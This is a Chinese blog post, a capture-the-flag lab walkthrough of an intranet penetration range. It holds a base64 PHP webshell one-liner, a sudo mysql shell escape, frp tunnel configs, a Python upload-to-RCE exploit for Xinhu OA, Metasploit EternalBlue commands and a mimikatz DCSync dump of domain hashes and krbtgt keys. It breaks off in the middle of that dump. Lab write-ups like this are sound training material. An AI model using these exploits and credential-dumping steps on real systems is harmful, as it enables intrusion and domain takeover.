@@ -1,0 +1,235 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>春秋云境-Initial | cheng_xing's blog</title><meta name="author" content="cheng_xing"><meta name="copyright" content="cheng_xing"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="入门级靶场，速通一下 fscan扫描外网 1234567891011121314151617D:\shentou\fscan&gt;fscan.exe -h 39.99.243.114 -p 1-65535   ___                              _  &#x2F; _ \     ___  ___ _ __ __ _  ___| | __ &#x2F; &#x2F;_\&#x2F;____&#x2F; __|&#x2F; _">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云境-Initial">
+<meta property="og:url" content="https://sakuraraindrop.github.io/2025/07/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/index.html">
+<meta property="og:site_name" content="cheng_xing&#39;s blog">
+<meta property="og:description" content="入门级靶场，速通一下 fscan扫描外网 1234567891011121314151617D:\shentou\fscan&gt;fscan.exe -h 39.99.243.114 -p 1-65535   ___                              _  &#x2F; _ \     ___  ___ _ __ __ _  ___| | __ &#x2F; &#x2F;_\&#x2F;____&#x2F; __|&#x2F; _">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sakuraraindrop.github.io/img/ltx.jpg">
+<meta property="article:published_time" content="2025-07-10T12:09:27.000Z">
+<meta property="article:modified_time" content="2025-07-10T13:34:10.163Z">
+<meta property="article:author" content="cheng_xing">
+<meta property="article:tag" content="thinkphp">
+<meta property="article:tag" content="sudo提权">
+<meta property="article:tag" content="信呼OA">
+<meta property="article:tag" content="MS17-010">
+<meta property="article:tag" content="票据传递">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sakuraraindrop.github.io/img/ltx.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "春秋云境-Initial",
+  "url": "https://sakuraraindrop.github.io/2025/07/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/",
+  "image": "https://sakuraraindrop.github.io/img/ltx.jpg",
+  "datePublished": "2025-07-10T12:09:27.000Z",
+  "dateModified": "2025-07-10T13:34:10.163Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "cheng_xing",
+      "url": "https://sakuraraindrop.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/ltx-icon.jpg"><link rel="canonical" href="https://sakuraraindrop.github.io/2025/07/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '春秋云境-Initial',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/hk.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">97</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/hk.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ltx-icon.jpg" alt="Logo"><span class="site-name">cheng_xing's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">春秋云境-Initial</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">春秋云境-Initial</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-10T12:09:27.000Z" title="发表于 2025-07-10 20:09:27">2025-07-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-10T13:34:10.163Z" title="更新于 2025-07-10 21:34:10">2025-07-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>入门级靶场，速通一下</p>
+<p>fscan扫描外网</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">D:\shentou\fscan&gt;fscan.exe -h 39.99.243.114 -p 1-65535</span><br><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">39.99.243.114:22 open</span><br><span class="line">39.99.243.114:80 open</span><br><span class="line">[*] alive ports len is: 2</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.99.243.114      code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="line">[+] PocScan http://39.99.243.114 poc-yaml-thinkphp5023-method-rce poc1</span><br><span class="line">已完成 2/2</span><br><span class="line">[*] 扫描结束,耗时: 5m11.4893336s</span><br></pre></td></tr></table></figure>
+
+<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>thinkphp老洞，先一把梭写个马，然后连上蚁剑<br><img src="/2025/07/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1.png" alt="alt text"></p>
+<p>tips:rce时可以这样写马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;PD9waHAgZXZhbCgkX1BPU1RbIjEiXSk7ID8+&#x27;|base64 -d&gt;shell.php</span><br></pre></td></tr></table></figure>
+
+<p>连上蚁剑终端发现权限比较低，先sudo -l看一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for www-data on ubuntu-web01:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line">User www-data may run the following commands on ubuntu-web01:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/mysql</span><br></pre></td></tr></table></figure>
+
+<p>发现mysql可以有root权限,且免密</p>
+<p>查找并读取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -e &#x27;\! find / -name flag*&#x27;</span><br><span class="line">sudo mysql -e &#x27;\! cat /root/flag/flag01.txt&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/2.png" alt="alt text"></p>
+<p>上传fscan和frp</p>
+<p>ifconfig看到内网IP是172.22.1.15，那么用fscan扫一下这个网段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">172.22.1.18:80 open</span><br><span class="line">172.22.1.15:80 open</span><br><span class="line">172.22.1.15:22 open</span><br><span class="line">172.22.1.21:445 open</span><br><span class="line">172.22.1.18:445 open</span><br><span class="line">172.22.1.2:445 open</span><br><span class="line">172.22.1.21:139 open</span><br><span class="line">172.22.1.2:139 open</span><br><span class="line">172.22.1.18:139 open</span><br><span class="line">172.22.1.2:88 open</span><br><span class="line">172.22.1.21:135 open</span><br><span class="line">172.22.1.18:135 open</span><br><span class="line">172.22.1.2:135 open</span><br><span class="line">172.22.1.18:3306 open</span><br><span class="line">[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.18</span><br><span class="line">   [-&gt;]XIAORANG-OA01</span><br><span class="line">   [-&gt;]172.22.1.18</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.2</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.1.2</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.21</span><br><span class="line">   [-&gt;]XIAORANG-WIN7</span><br><span class="line">   [-&gt;]172.22.1.21</span><br><span class="line">[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] OsInfo 172.22.1.2	(Windows Server 2016 Datacenter 14393)</span><br><span class="line">[+] MS17-010 172.22.1.21	(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class="line">[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600</span><br><span class="line">[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login</span><br><span class="line">[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统</span><br><span class="line">[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1</span><br></pre></td></tr></table></figure>
+
+<p>整理一下信息<br>外网入口39.99.243.114，其内网IP是172.22.1.15，已经拿下<br>内网主机172.22.1.2，为域控制器 DC:DC01.xiaorang.lab<br>内网主机172.22.1.18，为域内主机XIAORANG-OA01.xiaorang.lab，80端口有个信呼协同办公系统<br>内网主机172.22.1.21，为域内主机XIAORANG-WIN7.xiaorang.lab，存在MS17-010</p>
+<p>最后应该是要通过172.22.1.21去打域控的，先把172.22.1.18打了，做一下frp代理</p>
+<p>frpc.toml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">serverAddr = &quot;xxx.xxx.xxx.xxx&quot;</span><br><span class="line">serverPort = 7000</span><br><span class="line"></span><br><span class="line">[[proxies]]</span><br><span class="line">name = &quot;oa&quot;</span><br><span class="line">type = &quot;tcp&quot;</span><br><span class="line">localIP = &quot;172.22.1.18&quot;</span><br><span class="line">localPort = 80</span><br><span class="line">remotePort = 20022</span><br></pre></td></tr></table></figure>
+
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>首页看到是信呼协同办公系统v2.2.8</p>
+<p>使用弱密码admin&#x2F;admin123直接登录<br>然后就是复现nday</p>
+<p>先在exp.py同目录放一个1.php，内容如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后exp直接打<br>exp.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">url_pre = <span class="string">&#x27;http://vps:20022/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line">url3 = url_pre + <span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span></span><br><span class="line">data1 = &#123; <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>, <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>, <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>, <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>, <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span> &#125;</span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line"></span><br><span class="line">filepath = <span class="built_in">str</span>(r.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"></span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line">r = session.get(url3)</span><br><span class="line">data2 = &#123;<span class="string">&quot;1&quot;</span>: <span class="string">&quot;system(&#x27;dir&#x27;);&quot;</span>&#125;</span><br><span class="line">r = session.post(url_pre + filepath, data=data2)</span><br><span class="line"><span class="built_in">print</span>(r.text.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>从列出的目录里可以找到木马的文件名，直接蚁剑连上即可</p>
+<p><img src="/2025/07/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/3.png" alt="alt text"></p>
+<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>接下来打172.22.1.21，首先搭一个socks代理</p>
+<p>frpc.toml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = xxx.xxx.xxx.xxx</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 5000</span><br></pre></td></tr></table></figure>
+
+<p>然后用msf打</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line">set RHOSTS 172.22.1.21</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/07/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/4.png" alt="alt text"></p>
+<p>接下来是横向移动去打域控</p>
+<p>想进行DCSync攻击，必须获得以下任一用户的权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Administrators 组内的用户</span><br><span class="line">Domain Admins 组内的用户</span><br><span class="line">Enterprise Admins 组内的用户域控制器的计算机帐户</span><br><span class="line">即：默认情况下域管理员组具有该权限</span><br></pre></td></tr></table></figure>
+<p>这里我们用永恒之蓝打完本来就是system权限，因此可以进行DCSync攻击</p>
+<p>利用DCSync</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br></pre></td></tr></table></figure>
+
+<p>导出域内所有用户Hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[DC] &#x27;xiaorang.lab&#x27; will be the domain</span><br><span class="line">[DC] &#x27;DC01.xiaorang.lab&#x27; will be the DC server</span><br><span class="line">[DC] Exporting domain &#x27;xiaorang.lab&#x27;</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        514</span><br><span class="line">1106    Marcus  e07510a4284b3c97c8e7dee970918c5c        512</span><br><span class="line">1107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512</span><br><span class="line">1000    DC01$   e42fafd0e2581f9949964505dfee032b        532480</span><br><span class="line">500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        512</span><br><span class="line">1104    XIAORANG-OA01$  57db46b9d3f9df2dec50c8deb355e844        4096</span><br><span class="line">1108    XIAORANG-WIN7$  082b914dd550e3f17e88cd82d34f8b34        4096</span><br></pre></td></tr></table></figure>
+
+<p>生成黄金票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /user:krbtgt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">[DC] &#x27;xiaorang.lab&#x27; will be the domain</span><br><span class="line">[DC] &#x27;DC01.xiaorang.lab&#x27; will be the DC server</span><br><span class="line">[DC] &#x27;krbtgt&#x27; will be the user account</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line"></span><br><span class="line">Object RDN           : krbtgt</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : krbtgt</span><br><span class="line">Account Type         : 30000000 ( USER_OBJECT )</span><br><span class="line">User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   : </span><br><span class="line">Password last change : 2022/6/5 20:40:39</span><br><span class="line">Object Security ID   : S-1-5-21-314492864-3856862959-4045974917-502</span><br><span class="line">Object Relative ID   : 502</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: fb812eea13a18b7fcdb8e6d67ddc205b</span><br><span class="line">    ntlm- 0: fb812eea13a18b7fcdb8e6d67ddc205b</span><br><span class="line">    lm  - 0: c4f45322c850c77aecb3aa71c2e44c1e</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 849f7f8ab6eb3b3a1c7c926de5ee5574</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : XIAORANG.LABkrbtgt</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : acbbedcabc9ad1d8638cda298e15761626e1bce7ce80eae90d95252f8162bba8</span><br><span class="line">      aes128_hmac       (4096) : 207ea00513bdf19042937aa38c9ad2dd</span><br><span class="line">      des_cbc_md5       (4096) : c70ee386138c7016</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : XIAORANG.LABkrbtgt</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : c70ee386138c7016</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:WDigest *</span><br><span class="line">    01  e1108dfe63de9eeca1eefb995e0929bf</span><br><span class="line">    02  20b58dbb0fc4e2b4e2cb7ab85f3e711f</span><br><span class="line">    03  8a758e996035e1bc42ff1632cf94d2f4</span><br><span class="line">    04  